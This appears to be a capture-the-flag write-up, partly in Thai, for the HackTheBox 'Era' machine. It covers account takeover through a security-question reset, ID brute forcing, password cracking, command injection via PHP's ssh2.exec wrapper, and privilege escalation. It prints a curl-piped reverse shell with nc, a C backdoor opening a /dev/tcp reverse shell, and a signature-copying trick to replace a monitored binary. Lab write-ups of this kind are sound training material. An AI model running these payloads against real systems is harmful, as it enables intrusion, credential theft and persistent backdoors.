

![alt text](image.png)


![alt text](image-1.png)

![alt text](image-2.png)

![alt text](image-3.png)

information leaked by error "Username already exist"

this web have 2 authentication way 

1.username/password

2.security question 

![alt text](image-4.png)


on the reset.php we cam set security question on admin username

![alt text](image-5.png)

login as security question 


![alt text](image-7.png)

![alt text](image-6.png)

```
ffuf -w brucNum.txt -u http://file.era.htb/download.php?id=FUZZ  -fs 7686 -H "Cookie: PHPSESSID=glpnhmspppdeoq8meq6mfhhkmm" 

```

เนื่องจาก web ไม่ยอม exec file upload ใดๆ จึงลอง sql injection,brute force id


![alt text](image-8.png)

![alt text](image-9.png)

![alt text](image-10.png)

ภายในไฟล์ที่ download มา จะมี

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/Machines/Era]
└─$ file key.pem 
key.pem: OpenSSH private key (no password)

                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads/hackthebox/Machines/Era]
└─$ file filedb.sqlite 
filedb.sqlite: SQLite 3.x database, last written using SQLite version 3037002, file counter 93, database pages 5, cookie 0x5, schema 4, UTF-8, version-valid-for 93


```

![alt text](image-11.png)

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/Machines/Era]
└─$ john hashes.txt --show 
eric:america
yuri:mustang


```
admin_ef01cab31aa

![alt text](image-12.png)

![alt text](image-13.png)

ใช้สิท admin ส่ง parameter show ก็จะใช้ได้ ซึ่งมีการ allow wrapper protacal 

```
Wrapper protocol คือ โปรโตคอลที่ทำหน้าที่เป็นตัวกลางหรือตัวห่อหุ้มโปรโตคอลอื่น เพื่อเพิ่มฟังก์ชันการทำงานหรือปรับเปลี่ยนพฤติกรรมของโปรโตคอลเดิม. ยกตัวอย่างเช่น ใน PHP, wrapper protocol จะช่วยให้สามารถเข้าถึงไฟล์หรือทรัพยากรต่างๆ ผ่าน URL ได้

```

![alt text](image-15.png)

https://www.php.net/manual/en/function.fopen.php


เลือก wrapper protocal ที่สามารถ exec commnad ได้ นั่นคือ

ssh2.exec://eric:america@127.0.0.1/curl+http://10.10.14.22/

```
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');

```

ไม่เพียงแค่นั้น ขณะที่เรียก wrapper protocal มันยัง concat $file เข้าไปด้วย

![alt text](image-14.png)


```
shellTemp.sh

mkfifo /tmp/s; /bin/sh </tmp/s | nc 10.10.14.22 4444 >/tmp/s; rm /tmp/s


GET /download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/curl+http://10.10.14.22/shellTemp.sh|sh;

```
![alt text](image-16.png)


```
──(kali㉿kali)-[~/…/hackthebox/Machines/Era/files]
└─$ cat backdoor.c 
#include <stdlib.h>
int main() {
    system("/bin/bash -c '''bash -i >& /dev/tcp/10.10.14.22/4445 0>&1'''");
    return 0;
    }
ric@era:~$ gcc -static -o monitor_backdoor backdoor.c
gcc -static -o monitor_backdoor backdoor.c
eric@era:~$ objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
<ction .text_sig=sig /opt/AV/periodic-checks/monitor


eric@era:~$ objcopy --add-section .text_sig=sig monitor_backdoor
objcopy --add-section .text_sig=sig monitor_backdoor
eric@era:~$ 
cp monitor_backdoor /opt/AV/periodic-checks/monitor


```
![alt text](image-17.png)